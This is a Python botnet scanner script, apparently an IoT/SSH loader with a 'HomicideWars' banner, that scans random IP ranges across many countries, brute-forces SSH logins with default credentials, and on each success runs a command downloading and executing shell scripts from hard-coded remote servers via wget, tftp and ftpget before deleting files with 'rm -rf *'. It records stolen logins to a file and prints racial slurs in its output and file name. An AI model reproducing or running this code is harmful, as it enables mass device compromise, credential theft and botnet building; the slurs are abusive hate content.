#!/usr/bin/env python
 
# Modified by @ch3ats & @mips64
# If you Have this Kys please
# Usage: python custom.py THREADS RANGES 1(slow but effective) 2(fast but less effective) HERE IS A EXAMPLE 
#       python custom.py 500 5.78 101
#     ^^^^^^^slow but affective ^^^^^^^^
#       python custom.py 500 B 119.93 3 
#     ^^^^^^Fast But Not As stable^^^^^^
# Examples Below
# python custom.py 500 LUCKY 1 1
# python custom.py 500 B 119.93 3 
# python custom.py 500 LUCKY2 1 3
# python custom.py 500 B 101.109 1
# RANGES 113.53, 119.93, 122.3, 122.52, 101.108, 180.180, 125.27, 101.109,
import threading, paramiko, random, socket, time, sys

paramiko.util.log_to_file("/dev/null")
cmd='cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.136.178/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 198.167.136.178 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 198.167.136.178; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.167.136.178/ ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *'
blacklist = [
    '127'
]

passwords = [ 
	"admin:admin"
]

if sys.argv[4] == '1':
     passwords = ["root:root"]
if sys.argv[4] == '2':
     passwords = ["guest:guest"]
if sys.argv[4] == '3':
     passwords = ["admin:1234"]
if sys.argv[4] == '4':
     passwords = ["telnet:telnet"]

print "\x1b[1;35m            __  __ ___ __\x1b[1;35m"
print "\x1b[1;35m           |__)/  \ | (_ \x1b[1;35m"
print "\x1b[1;35m           |__)\__/ | __)\x1b[1;35m"
print "\x1b[1;35m           ~{HomicideWars}~\x1b[1;35m"
print "\x1b[1;35m Bots Should Be Joining By Time You Read This\x1b[1;35m"

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip
class sshscanner(threading.Thread):
    global passwords
    global ipclassinfo
    if ipclassinfo == "A":
        global ip1
    elif ipclassinfo == "B":
        global ip1
        global ip2
    elif ipclassinfo == "C":
        global ip1
        global ip2
        global ip3
    def run(self):
        while 1:
            try:
                while 1:
                    thisipisbad='no'
                    if ipclassinfo == "A":
                        self.host = ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "B":
                        self.host = ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "C":
                        self.host = ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "BRAZIL":
                        br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
                        self.host = random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "ER":
                        yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
                        self.host = random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY":
                        lucky = ["125.27","101.109","113.53","118.173","122.170","122.180","46.62","5.78","101.108","1.20","125.25","125.26","182.52","118.172","118.174","118.175","125.24"]
                        self.host = random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "LUCKY2":
                        lucky2 = [ "122.3","122.52","122.54","119.93","124.105","125.104","49.144","49.145","49.146" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
		    elif ipclassinfo == "LUCKY3":
                        lucky2 = [ "103.20","103.30","103.47","103.57" ]
			self.host = random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "RAND":
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    elif ipclassinfo == "INTERNET":
                        lol = ["1"]
                        self.host = random.choice(lol)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    else:
                        self.host = str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
                    for badip in blacklist:
                        if badip in self.host:
                            thisipisbad='yes'
                    if thisipisbad=='no':
                        break
                username='root'
                password=""
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.host, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.host, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                output = stdout.read()
                if "inet addr" in output:
                    badserver=False
                if badserver == False:
                        print 'Found A Nigga in The Street '+self.host+'|'+username+'|'+password+'|'+str(port)
			ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.122/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 50.115.166.122 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 50.115.166.122; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 50.115.166.122 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
			nigger = open("niggers.txt", "a").write(username + ":" + password + ":" + self.host + "\n")
                        time.sleep(15)
                        ssh.close()
            except:
                pass

for x in range(0,1500):
    try:
        t = sshscanner()
        t.start()
    except:
        pass
